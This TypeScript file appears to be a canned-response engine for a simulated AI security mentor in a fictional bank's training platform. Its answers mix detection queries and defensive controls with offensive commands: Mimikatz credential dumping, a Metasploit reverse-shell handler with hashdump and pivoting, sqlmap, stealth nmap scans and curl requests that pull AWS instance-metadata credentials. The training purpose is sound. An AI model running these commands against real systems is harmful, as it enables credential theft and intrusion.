// src/services/LocalAIService.ts
// Offline AI Copilot — deterministic keyword/pattern matching with contextual GFS responses

export interface AIResponse {
  content: string;
  references: string[];
  confidence: 'High' | 'Medium' | 'Low';
  suggestedActions?: string[];
}

// ─── Response Templates ────────────────────────────────────────────────────────

const RESPONSE_MAP: { pattern: RegExp; response: () => AIResponse }[] = [
  {
    pattern: /\b(kerberoast|kerberoasting|spn|tgs|rc4|t1558\.003)\b/i,
    response: () => ({
      content: `**Kerberoasting (T1558.003)** is a credential theft technique targeting Active Directory service accounts.

**How it works at GFS:**
1. An attacker with any valid domain credential requests Kerberos Service Tickets (TGS) for accounts with Service Principal Names (SPNs)
2. The TGS tickets are encrypted with the service account's NTLM password hash
3. The attacker extracts these tickets and cracks them offline using tools like Hashcat

**Detected in GFS environment:** Splunk correlation rule fires when >3 distinct SPN requests occur within 5 minutes from a single source (EventCode 4769, etype=0x17).

**GFS Defensive Controls:**
- All service accounts use Group Managed Service Accounts (gMSA) with auto-rotating 240-character passwords
- AES-256 encryption mandated — RC4 (0x17) blocked by GPO
- Alert: SOC-2026-0438 is an active Kerberoasting detection in your queue

**Remediation Steps:**
\`\`\`powershell
# Identify RC4-enabled service accounts
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties msDS-SupportedEncryptionTypes |
  Where-Object {$_."msDS-SupportedEncryptionTypes" -band 4}
\`\`\``,
      references: ['MITRE ATT&CK T1558.003', 'CIS Control 5.4', 'NIST AC-6'],
      confidence: 'High',
      suggestedActions: ['Review SOC Alert SOC-2026-0438', 'Run Kerberoasting hunt query in Module 7', 'Check gMSA configuration in Active Directory'],
    }),
  },
  {
    pattern: /\b(sql.?inject|sqli|union select|t1190|error.based|blind.?sql)\b/i,
    response: () => ({
      content: `**SQL Injection (T1190)** is the #1 web application vulnerability and a critical risk to GFS transaction databases.

**GFS Context:** The Core Banking API (10.10.20.11:1521) is the highest-value SQL injection target. A successful attack could expose transaction records for 5M+ customers.

**Attack Types:**
- **Error-Based:** Database error messages reveal schema information
- **Union-Based:** Appending UNION SELECT to extract data from other tables
- **Blind Time-Based:** Using SLEEP() delays to infer boolean conditions
- **Out-of-Band:** Exfiltrating data via DNS queries (used against air-gapped DBs)

**Active Alert:** SOC-2026-0439 shows 847 SQLi payloads against the Core Banking API — 4 returned HTTP 200.

**GFS Defense Stack:**
- Cloudflare Enterprise WAF with SQLi rule set (Managed Rules)
- Parameterized queries enforced in all GFS application code (code review gate)
- Oracle Audit Vault monitoring for anomalous query patterns

**Test Command (Authorized Range Only):**
\`\`\`bash
sqlmap -u "http://target/api/accounts" --data "id=1" --level 3 --dbms=oracle --batch
\`\`\``,
      references: ['OWASP Top 10 A03:2021', 'MITRE T1190', 'PCI-DSS Req 6.2.4'],
      confidence: 'High',
      suggestedActions: ['Review active SQLi alert SOC-2026-0439', 'Complete Module 17: Web Security', 'Run SQLMap lab exercise'],
    }),
  },
  {
    pattern: /\b(mimikatz|lsass|credential.dump|pass.the.hash|pth|t1003)\b/i,
    response: () => ({
      content: `**Credential Dumping (T1003)** — particularly LSASS memory extraction — is one of the most dangerous post-exploitation techniques used against GFS.

**LSASS Memory (T1003.001):** Windows stores NTLM hashes and Kerberos tickets in the Local Security Authority Subsystem Service process. Mimikatz extracts these in seconds.

**Active Incident:** SOC-2026-0440 shows non-standard process accessing LSASS on GFS-LT-1101 (cheryl.jenkins). This requires immediate action.

**Mimikatz Commands Used by Attackers:**
\`\`\`
privilege::debug           # Obtain SeDebugPrivilege
sekurlsa::logonpasswords   # Dump cleartext passwords + hashes
sekurlsa::tickets          # Dump Kerberos tickets
lsadump::dcsync /user:krbtgt  # DCSync attack — replicates from DC
\`\`\`

**GFS Defensive Controls:**
- **Windows Defender Credential Guard** — stores credentials in VBS-isolated container (LSASS cannot be accessed even as SYSTEM)
- **Protected Users Group** — disables NTLM, caching, RC4 Kerberos for privileged accounts
- **CrowdStrike Behavioral Detection** — flags any non-OS process accessing LSASS memory regions
- **EDR Telemetry** — Process injection, handle acquisition to lsass.exe logged and alerted

**Immediate Response for SOC-2026-0440:**
1. Isolate GFS-LT-1101 via CrowdStrike containment
2. Capture memory dump: \`winpmem_mini_x64.exe GFS-LT-1101-mem.raw\`
3. Rotate ALL credentials for cheryl.jenkins and any accounts authenticated to this host
4. Hunt for lateral movement from this host in Splunk`,
      references: ['MITRE T1003.001', 'Windows Credential Guard Docs', 'CIS Control 5.2'],
      confidence: 'High',
      suggestedActions: ['Triage SOC Alert SOC-2026-0440 immediately', 'Complete Module 8: Incident Response', 'Run memory forensics lab'],
    }),
  },
  {
    pattern: /\b(splunk|spl|search.?query|index=|sourcetype|timechart|stats count|eventstats)\b/i,
    response: () => ({
      content: `**Splunk SPL (Search Processing Language)** is the core detection and hunting tool in the GFS SOC.

**Essential SPL Patterns for GFS Detection:**

**Kerberoasting Detection:**
\`\`\`spl
index=windows EventCode=4769 Ticket_Encryption_Type=0x17
| bucket _time span=5m
| stats dc(Service_Name) as unique_spns by src_ip, _time
| where unique_spns > 3
\`\`\`

**Lateral Movement Detection:**
\`\`\`spl
index=windows EventCode=4624 LogonType=3
| bucket _time span=15m
| stats dc(ComputerName) as hosts by Account_Name, _time
| where hosts >= 3
| sort -hosts
\`\`\`

**Data Exfiltration Hunt (Firewall):**
\`\`\`spl
index=palo_alto action=allow
| eventstats avg(bytes_out) as avg_bytes
| where bytes_out > avg_bytes * 5 AND bytes_out > 104857600
| table _time, src_ip, dest_ip, bytes_out, rule_name
\`\`\`

**C2 Beacon Detection (DNS):**
\`\`\`spl
index=dns
| bucket _time span=1h
| stats count by src_ip, query, _time
| where count > 100
| sort -count
\`\`\`

**GFS Splunk Instance:** hy-dc05-splunk-sh01.gfs.local (10.10.50.11)
Ingest rate: 140TB/day from 2,400+ log sources`,
      references: ['Splunk SPL Reference', 'GFS Detection Engineering Runbook', 'MITRE ATT&CK Splunk App'],
      confidence: 'High',
      suggestedActions: ['Launch Module 7: SIEM Lab', 'Practice Kerberoasting hunt query', 'Try the log search in the SOC console'],
    }),
  },
  {
    pattern: /\b(nmap|port.scan|service.detect|network.scan|syn.scan|-sS|-sV)\b/i,
    response: () => ({
      content: `**Nmap** is the GFS-authorized network scanning tool for vulnerability assessments and penetration testing.

**GFS Authorized Scan Templates:**

**Stealth Ping Sweep (Host Discovery):**
\`\`\`bash
nmap -sn -T2 --randomize-hosts 10.10.20.0/24 -oG ping-sweep.txt
\`\`\`

**Full Service Version Scan:**
\`\`\`bash
nmap -sS -sV -sC -O -p- --script vuln -T2 10.10.20.11 -oA full-scan
\`\`\`

**Quick Targeted Scan (Critical Ports):**
\`\`\`bash
nmap -sV -p 22,80,443,1521,8443,3389,5985 10.10.20.0/24
\`\`\`

**GFS VLAN Targets (Cyber Range Only):**
- Core Banking VLAN: \`10.10.20.0/24\`
- SWIFT Enclave: \`10.10.30.0/24\` (requires Compartmented_SecOps clearance)
- ATM Network: \`10.11.200.0/24\`
- Workstations: \`10.100.10.0/22\`

⚠️ **IMPORTANT:** Only scan the Cyber Range environments (10.10.99.0/24). Never run Nmap against production GFS systems without written authorization from the CISO and signed RoE document.

**Scan Timing Reference:**
- T0: Paranoid (15 min/host) — IDS evasion
- T2: Polite (reduces bandwidth impact) — Authorized testing
- T4: Aggressive (fast) — Lab environments only`,
      references: ['Nmap Reference Guide', 'GFS Penetration Testing RoE', 'NIST SP 800-115'],
      confidence: 'High',
      suggestedActions: ['Complete Module 10: Scanning Lab', 'Review GFS VLAN topology in Module 2', 'Practice stealth scan in cyber range'],
    }),
  },
  {
    pattern: /\b(metasploit|msfconsole|meterpreter|exploit|payload|reverse.?tcp|shell)\b/i,
    response: () => ({
      content: `**Metasploit Framework** is GFS's authorized exploitation platform for red team engagements and penetration testing.

**Essential Commands:**
\`\`\`
msfconsole                                    # Start Metasploit
search type:exploit platform:linux            # Search Linux exploits
use exploit/multi/handler                     # Generic reverse shell handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.100.10.100                       # Attacker IP (cyber range)
set LPORT 4444
exploit -j                                    # Run as background job
sessions -l                                  # List active sessions
sessions -i 1                                # Interact with session 1
\`\`\`

**Post-Exploitation (Meterpreter):**
\`\`\`
getsystem              # Attempt privilege escalation
hashdump               # Dump Windows password hashes
load kiwi              # Load Mimikatz module
creds_all              # Dump all credentials
run post/multi/recon/local_exploit_suggester  # Find local privesc
run post/multi/manage/socks_proxy SRVPORT=1080 VERSION=5  # Setup pivot
\`\`\`

**GFS Cyber Range Target:** 10.10.99.100 (vulnerable-base:latest)
All exploitation must be performed ONLY in the Cyber Range. Metasploit against any production GFS IP without written authorization is a terminable offense and criminal violation.`,
      references: ['MITRE ATT&CK: TA0002 Execution', 'Metasploit Unleashed', 'GFS Red Team Rules of Engagement'],
      confidence: 'High',
      suggestedActions: ['Complete Module 13: System Hacking', 'Set up Metasploit handler for cyber range', 'Review post-exploitation techniques'],
    }),
  },
  {
    pattern: /\b(phishing|social.?engineer|vishing|pretexting|spear.?phish)\b/i,
    response: () => ({
      content: `**Social Engineering & Phishing** — 82% of GFS security incidents begin with a phishing attack.

**GFS Threat Intelligence — Active Campaigns:**
- TrickBot variant targeting GFS finance team (July 2026)
- Spear-phishing campaign using GFS job posting lures
- Vishing calls impersonating IT Help Desk

**Key Psychological Principles Attackers Use:**
1. **Authority** — Impersonating IT, CISO, or regulators
2. **Urgency** — "Your account expires TODAY"
3. **Scarcity** — Fear of losing access or missing a deadline
4. **Social Proof** — "All other employees have already updated"
5. **Reciprocity** — Offering something before asking for credentials

**GFS Phishing Simulation Metrics (Q2 2026):**
- Click Rate: 23% (target: <5%)
- Credential Submission: 8.2% (target: <2%)
- Report Rate: 14% (target: >20%)

**FIDO2/WebAuthn vs TOTP:**
FIDO2 is phishing-resistant because the authentication challenge is cryptographically bound to the exact origin URL — a phishing site cannot replay the credential.

**GFS Help Desk Verification Procedure:**
1. Politely explain callback policy
2. Look up official number in GFS directory (not provided by caller)
3. Call back on official number before any account action
4. Log all verification attempts`,
      references: ['MITRE T1566', 'SANS Phishing Defense Guide', 'GFS Security Awareness Policy'],
      confidence: 'High',
      suggestedActions: ['Complete Module 16: Social Engineering', 'Review phishing simulation metrics in dashboard', 'Practice GoPhish campaign setup'],
    }),
  },
  {
    pattern: /\b(volatility|memory.?forensic|vol\.py|malfind|netscan|pslist|hashdump)\b/i,
    response: () => ({
      content: `**Volatility 3** is the GFS IR team's memory forensics tool for post-compromise analysis.

**Essential Plugins:**
\`\`\`bash
# List running processes from memory
vol.py -f mem.raw windows.pslist

# Process tree (shows parent-child relationships)
vol.py -f mem.raw windows.pstree

# Network connections (catch C2 even after process exits)
vol.py -f mem.raw windows.netscan | grep ESTABLISHED

# Detect injected code/shellcode
vol.py -f mem.raw windows.malfind

# Extract NTLM hashes
vol.py -f mem.raw windows.hashdump

# Show all process command lines
vol.py -f mem.raw windows.cmdline

# Dump suspicious process memory
vol.py -f mem.raw windows.memmap --pid 1234 --dump
\`\`\`

**GFS IR Memory Capture Procedure:**
\`\`\`cmd
# Windows (before ANY remediation)
winpmem_mini_x64.exe C:\\IR\\%COMPUTERNAME%-mem.raw

# Linux
sudo dd if=/dev/mem of=/tmp/$(hostname)-mem.raw bs=1M
# or: sudo avml /tmp/$(hostname)-mem.raw
\`\`\`

**Order of Volatility (Collect Most Volatile First):**
1. Running processes + network connections
2. Full RAM image
3. Disk image
4. Log files
5. Archived/backup data

**Active Use Case:** SOC-2026-0440 (LSASS access on GFS-LT-1101) — memory capture should be the first action before any reboot.`,
      references: ['Volatility 3 Docs', 'GFS IR Playbook Phase 2', 'RFC 3227 Order of Volatility'],
      confidence: 'High',
      suggestedActions: ['Complete Module 8: Incident Response', 'Practice memory forensics in lab', 'Triage active incident SOC-2026-0440'],
    }),
  },
  {
    pattern: /\b(swift|mt103|t1565\.002|payment.fraud|financial.crime)\b/i,
    response: () => ({
      content: `**SWIFT Transaction Security** — GFS's most sensitive payment infrastructure.

**GFS SWIFT Architecture:**
- Primary Gateway: ny-dc01-swift-gw01.gfs.local (10.10.30.11) — RHEL 8.9 Air-Gapped
- DR Gateway: ln-dc02-swift-gw01.gfs.local (10.10.30.21) — London
- Network: VLAN 30 (10.10.30.0/24) — Air-Gapped, no internet connectivity
- Access: Jump server mandatory, all sessions recorded via CyberArk

**SWIFT CSCF v2025 Controls at GFS:**
- Air-gap isolation from internet
- HSM-backed transaction signing (prevents forgery)
- Multi-party authorization for transfers >$1M
- All sessions logged and transmitted to SWIFT's independent audit log
- Real-time transaction pattern monitoring

**Active Threat:** SOC-2026-0437 shows unauthorized RDP to SWIFT gateway from workstation VLAN — this is a CRITICAL policy violation and potential indicator of SWIFT fraud setup.

**SWIFT Fraud Indicators (Bangladesh Bank Style Attack):**
1. Unauthorized access to SWIFT operator workstation
2. MT103 messages with unusual beneficiary accounts
3. Transactions outside normal business hours
4. Deletion of SWIFT confirmation messages (T1565.002)

**Immediate Response for SWIFT Compromise Indicator:**
1. Notify SWIFT Operations team immediately
2. Suspend all pending SWIFT transactions
3. Contact recipient banks to recall any suspicious transfers
4. Engage SWIFT's Customer Security Intelligence team`,
      references: ['SWIFT CSCF v2025', 'Bangladesh Bank Heist Case Study', 'MITRE T1565.002'],
      confidence: 'High',
      suggestedActions: ['Investigate SOC-2026-0437', 'Review SWIFT security controls in Module 1', 'Complete Module 20 Capstone'],
    }),
  },
  {
    pattern: /\b(linux|rhel|bash|chmod|chown|sudo|cron|systemd|suid|audit|auditd|var.log)\b/i,
    response: () => ({
      content: `**Linux Security** — GFS runs RHEL 9.4 across 140+ production servers.

**Critical Security Commands:**

**Audit & Forensics:**
\`\`\`bash
# Find SUID binaries (privilege escalation risk)
find / -perm -4000 -type f 2>/dev/null

# Check all cron jobs for suspicious entries
for cron in /etc/cron* /var/spool/cron/*; do echo "=== $cron ==="; cat $cron 2>/dev/null; done

# Review successful SSH logins with source IPs
grep "Accepted" /var/log/secure | awk '{print $9, $11, $1, $2, $3}'

# Check for world-writable files (data integrity risk)
find /etc /usr /var -perm -002 -type f 2>/dev/null

# Audit sudo privileges
sudo -l -U <username>
cat /etc/sudoers && ls /etc/sudoers.d/
\`\`\`

**auditd (Linux Audit System):**
\`\`\`bash
# Search for all executed commands today
ausearch -m execve -ts today | grep -E "wget|curl|nc|bash -i|python -c"

# Watch for privilege escalation attempts
ausearch -m syscall -sc setuid -ts today

# Check audit log location
cat /etc/audit/auditd.conf | grep log_file
# Default: /var/log/audit/audit.log
\`\`\`

**GFS RHEL Baseline Requirements:**
- SELinux: enforcing mode
- auditd: enabled, logs to /var/log/audit/
- Firewalld: enabled, only required ports open
- SSH: key-only, root login disabled, Protocol 2 only`,
      references: ['RHEL 9 Security Guide', 'CIS RHEL 9 Benchmark', 'MITRE T1059.004'],
      confidence: 'High',
      suggestedActions: ['Complete Module 3: Linux Operations Lab', 'Review SUID binary audit exercise', 'Practice auditd log analysis'],
    }),
  },
  {
    pattern: /\b(active.?directory|ad|domain|gpo|group.?policy|ldap|kerberos|ntlm)\b/i,
    response: () => ({
      content: `**Active Directory** — GFS's authentication backbone. AD compromise = total enterprise compromise.

**GFS AD Structure:**
- Forest: GFS.LOCAL (single forest, 3 domains)
- Domain Controllers: ny-dc01 (10.10.20.50), ln-dc02, sg-dc03
- Users: 8,200+ employees
- Computers: 400+ servers, 8,000 workstations

**Critical Security PowerShell:**
\`\`\`powershell
# Find all Domain Admin members
Get-ADGroupMember "Domain Admins" -Recursive | Select Name, SamAccountName

# Identify Kerberoastable accounts (SPN + RC4)
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties msDS-SupportedEncryptionTypes |
  Where-Object {$_."msDS-SupportedEncryptionTypes" -band 4}

# Check Protected Users group members
Get-ADGroupMember "Protected Users" | Select Name

# Find accounts with non-expiring passwords
Get-ADUser -Filter {PasswordNeverExpires -eq $true} | Select Name, SamAccountName

# List all SPNs (Kerberoasting targets)
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
\`\`\`

**Top AD Attack Paths (BloodHound):**
1. WriteDACL on Domain Admins group → ACL abuse privilege escalation
2. Kerberoastable service accounts with weak passwords
3. GenericAll on user objects → password reset attacks
4. AS-REP Roasting (preauth disabled accounts)

**GFS AD Security Controls:**
- Microsoft Defender for Identity (detects lateral movement, Kerberoasting)
- Protected Users group: all C-suite + domain admins
- Tiered administration model (Tier 0/1/2 admin separation)
- CyberArk PAM for all privileged AD access`,
      references: ['MITRE T1078.002', 'BloodHound Documentation', 'GFS AD Security Policy'],
      confidence: 'High',
      suggestedActions: ['Complete Module 4: Windows Enterprise Lab', 'Run BloodHound attack path analysis', 'Review Kerberoasting detection in Module 7'],
    }),
  },
  {
    pattern: /\b(cloud|aws|azure|s3|iam|kubernetes|k8s|imds|metadata|ec2|container)\b/i,
    response: () => ({
      content: `**Cloud Security** — GFS operates hybrid cloud across AWS and Azure.

**GFS Cloud Infrastructure:**
- AWS: 40 EC2 instances, 8 Kubernetes clusters (EKS), S3 buckets for backups
- Azure: 12 SQL Managed Instances, Entra ID (hybrid identity), Azure Sentinel
- Kubernetes: Production workloads in Digital Banking (BU-02)

**Critical AWS Security Checks:**
\`\`\`bash
# Check for overprivileged IAM policies
aws iam list-attached-role-policies --role-name gfs-app-role
aws iam get-policy-document --policy-arn <arn> --version-id v1

# Check S3 public access
aws s3api get-bucket-public-access-block --bucket gfs-backup-2024
aws s3api get-bucket-acl --bucket gfs-backup-2024

# CloudTrail - recent API calls
aws cloudtrail lookup-events --max-results 50 --start-time 2026-07-09

# Extract IMDS credentials (pentest - authorized only)
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/
\`\`\`

**Kubernetes RBAC Audit:**
\`\`\`bash
kubectl auth can-i --list --namespace default
kubectl get clusterrolebindings -o json | jq '.items[] | select(.roleRef.name=="cluster-admin")'
kube-bench run --targets node,policies --version 1.29
\`\`\`

**GFS AWS Security Stack:**
- AWS Security Hub (aggregates GuardDuty, Inspector, Macie)
- AWS GuardDuty: ML-based threat detection
- AWS Macie: PII detection in S3 buckets
- Prowler: CIS benchmark compliance scanning`,
      references: ['AWS Security Hub Docs', 'CIS AWS Foundations Benchmark', 'MITRE T1530, T1078.004'],
      confidence: 'High',
      suggestedActions: ['Complete Module 18: Cloud Security', 'Run Prowler IAM audit exercise', 'Review IMDS credential extraction lab'],
    }),
  },
  {
    pattern: /\b(threat.hunt|hunting|hypothesis|lolbas|living.off.the.land|ueba|behavior.analytic)\b/i,
    response: () => ({
      content: `**Threat Hunting** — GFS Threat Hunting team detects 40% of incidents before any alert fires.

**Hypothesis-Driven Hunting Framework:**

**Step 1: Hypothesis Formation**
- Based on: MITRE ATT&CK TTPs, recent threat intel, environmental changes
- Example: "APT actors targeting GFS banking sector are using LOLBAS techniques to evade AV"

**Step 2: Data Sources Required**
- Windows Event Logs (Process creation 4688, PowerShell 4104)
- CrowdStrike process telemetry
- Network flow data (NetFlow/Zeek)

**Step 3: Hunt Queries**

\`\`\`spl
# LOLBAS Hunt - certutil download
index=windows process_name=certutil.exe
  (process_args="*urlcache*" OR process_args="*encode*")
| stats count by host, user, process_args | where count < 3

# mshta.exe remote URL execution
index=windows process_name=mshta.exe earliest=-7d
| eval is_remote=if(match(process_args,"https?://"),1,0)
| where is_remote=1
| table _time, host, user, process_args, parent_process

# Office spawning PowerShell
index=windows process_name=powershell.exe
  parent_process IN ("winword.exe","excel.exe","outlook.exe")
| stats count by host, user, parent_process | sort -count

# DNS Tunneling Detection
index=dns | eval subdomain=replace(query,"\\\\.[^.]+\\\\.[^.]+$","")
| eval entropy=len(subdomain)/len(replace(subdomain,"[aeiou]",""))
| where len(subdomain) > 40 AND entropy > 3
| stats count by src_ip, query | where count > 50
\`\`\`

**GFS Priority LOLBAS Monitoring:**
certutil.exe, mshta.exe, wscript.exe, cscript.exe, regsvr32.exe, rundll32.exe, bitsadmin.exe`,
      references: ['MITRE ATT&CK T1218', 'LOLBAS Project', 'GFS Threat Hunting Runbook'],
      confidence: 'High',
      suggestedActions: ['Complete Module 19: Threat Hunting', 'Run LOLBAS hunt in SIEM console', 'Build DNS tunneling detection query'],
    }),
  },
  {
    pattern: /\b(cvss|vulnerability|cve|nessus|openvas|patch|remediation|epss|kev)\b/i,
    response: () => ({
      content: `**Vulnerability Management** — GFS processes 1,200+ CVEs monthly.

**CVSS v3.1 Vector Components:**
- **AV** (Attack Vector): N=Network, A=Adjacent, L=Local, P=Physical
- **AC** (Attack Complexity): L=Low, H=High
- **PR** (Privileges Required): N=None, L=Low, H=High
- **UI** (User Interaction): N=None, R=Required
- **S** (Scope): U=Unchanged, C=Changed
- **CIA Impact**: H=High, L=Low, N=None

**GFS Patching SLA:**
| Severity | CVSS | SLA | Process |
|----------|------|-----|---------|
| Critical | 9.0-10.0 | 15 days | Emergency CAB |
| High | 7.0-8.9 | 30 days | Standard CAB |
| Medium | 4.0-6.9 | 90 days | Monthly cycle |
| Low | 0.1-3.9 | Best effort | Annual |
| KEV Listed | Any | 72h (external) / 7d (internal) | Emergency |

**Prioritization Formula:**
\`\`\`
Risk Score = CVSS Base Score × Asset Criticality Multiplier × EPSS Score
Tier 1 Multiplier: 3.0
Tier 2 Multiplier: 2.0
Tier 3 Multiplier: 1.0
\`\`\`

**Key CVEs Affecting GFS Infrastructure:**
- CVE-2021-44228 (Log4Shell) — check all Java applications
- CVE-2023-44487 (HTTP/2 Rapid Reset) — GFS API Gateway risk
- CVE-2023-20198 (Cisco IOS XE) — NOC infrastructure`,
      references: ['CVSS v3.1 Specification', 'CISA KEV Catalog', 'NIST NVD', 'EPSS Model'],
      confidence: 'High',
      suggestedActions: ['Complete Module 12: Vulnerability Assessment', 'Run Nessus scan in cyber range', 'Review CISA KEV for current GFS exposure'],
    }),
  },
];

// ─── Fallback Responses ────────────────────────────────────────────────────────

const FALLBACK_RESPONSES: AIResponse[] = [
  {
    content: `**⚠️ Simulated AI Mentor**\n\nI am an offline simulated AI mentor built for this prototype. I am not connected to a live LLM backend, so I cannot answer arbitrary questions. I only understand specific hardcoded demonstration topics.\n\n**Try asking me one of these exact phrases to see how I work:**\n- "Explain Kerberoasting and how to detect it"\n- "Walk me through the LSASS memory dump incident response"\n- "Show me SPL queries for lateral movement detection"\n- "What happened in the C2 beacon alert?"\n- "Explain the SWIFT fraud attack chain"\n- "How does FIDO2 prevent phishing?"`,
    references: [],
    confidence: 'Medium',
    suggestedActions: ['Open the SOC Console to triage active alerts', 'Launch Module 1 to begin training', 'Use SIEM Log Search to investigate incidents'],
  },
  {
    content: `**GFS Security Quick Reference:**

Your current security clearance (**Restricted**) gives you access to:
- Modules 1–16 (Phases 1-3)
- SOC Operations Console
- SIEM Log Search
- Threat Hunting Workbench

**Locked (requires Highly_Confidential):**
- Module 17: Web Security (Burp Suite Pro exercises)
- Module 18: Cloud Security (AWS/Azure exploitation)
- Module 19: Threat Hunting (Advanced)
- Module 20: Capstone Enterprise Incident

**Your Active Alerts (Action Required):**
- SOC-2026-0441: C2 Beacon — P1 — UNASSIGNED
- SOC-2026-0440: LSASS Dump — P1 — Assigned to you
- SOC-2026-0439: SQL Injection — P1 — UNASSIGNED

Ask me anything about security techniques, GFS infrastructure, or module content!`,
    references: ['GFS Security Clearance Policy', 'GFS SOC Operational Handbook'],
    confidence: 'Medium',
    suggestedActions: ['Triage P1 alert SOC-2026-0441', 'Continue Module investigation'],
  },
];

// ─── Main Service Function ────────────────────────────────────────────────────

let fallbackIndex = 0;

export function queryLocalAI(userMessage: string): AIResponse {
  const lowerMsg = userMessage.toLowerCase();

  // Try each pattern matcher
  for (const { pattern, response } of RESPONSE_MAP) {
    if (pattern.test(lowerMsg)) {
      return response();
    }
  }

  // Return rotating fallback
  const fallback = FALLBACK_RESPONSES[fallbackIndex % FALLBACK_RESPONSES.length];
  fallbackIndex++;
  return fallback;
}

export async function queryAIWithDelay(userMessage: string, delayMs = 600): Promise<AIResponse> {
  // Simulate realistic AI processing time
  await new Promise(resolve => setTimeout(resolve, delayMs + Math.random() * 400));
  return queryLocalAI(userMessage);
}

// ─── Quick Prompt Suggestions ─────────────────────────────────────────────────

export const QUICK_PROMPTS = [
  'Explain Kerberoasting and how to detect it',
  'Walk me through the LSASS dump incident response',
  'Show SPL queries for lateral movement detection',
  'What happened in the C2 beacon alert?',
  'Explain SWIFT fraud attack chains',
  'How does FIDO2 prevent phishing?',
  'What is the GFS CVSS patching SLA for Critical findings?',
  'Explain DNS tunneling detection techniques',
];
